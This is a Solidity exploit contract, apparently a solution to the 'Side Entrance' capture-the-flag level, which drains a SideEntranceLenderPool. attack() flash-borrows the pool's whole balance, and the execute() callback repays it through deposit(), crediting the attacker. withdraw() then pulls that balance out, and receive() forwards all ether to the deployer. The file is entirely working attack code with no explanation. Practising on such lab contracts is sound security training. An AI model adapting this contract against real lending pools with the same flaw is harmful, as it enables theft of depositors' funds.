// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "./SideEntranceLenderPool.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract Attacker is IFlashLoanEtherReceiver {
    address public immutable attacker;
    address public immutable target;

    constructor(address _target) {
        attacker = msg.sender;
        target = _target;
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker, "only attacker");
        _;
    }

    function execute() external payable override {
        SideEntranceLenderPool(payable(target)).deposit{value: address(this).balance}();
    }

    function attack() external onlyAttacker {
        require(target != address(0));
        SideEntranceLenderPool(payable(target)).flashLoan(target.balance);
    }

    function withdraw() external onlyAttacker {
        SideEntranceLenderPool(payable(target)).withdraw();
    }

    receive() external payable {
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success);
    }
}
